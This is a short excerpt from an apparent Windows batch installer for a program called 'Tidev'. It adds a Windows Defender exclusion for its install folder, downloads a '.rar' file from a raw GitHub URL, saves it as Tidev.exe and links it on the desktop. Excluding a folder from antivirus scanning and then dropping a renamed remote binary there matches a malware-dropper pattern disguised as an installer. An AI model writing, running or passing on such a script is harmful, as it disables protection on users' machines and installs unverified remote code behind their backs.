...
echo.
mkdir "%HomeDrive%\Program Files\Tidev"
...
echo.
powershell Add-MpPreference -ExclusionPath '%HomeDrive%\Program Files\Tidev'
...
echo.
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/khathiatz/tidev/master/update_all_tidev.rar','%HomeDrive%\Program Files\Tidev\Tidev.exe')
...
echo.
mklink "%userprofile%\Desktop\Tidev" "%HomeDrive%\Program Files\Tidev\Tidev.exe"
...
if not exist "%HomeDrive%\Program Files\Tidev\Tidev.exe" GOTO InstallError
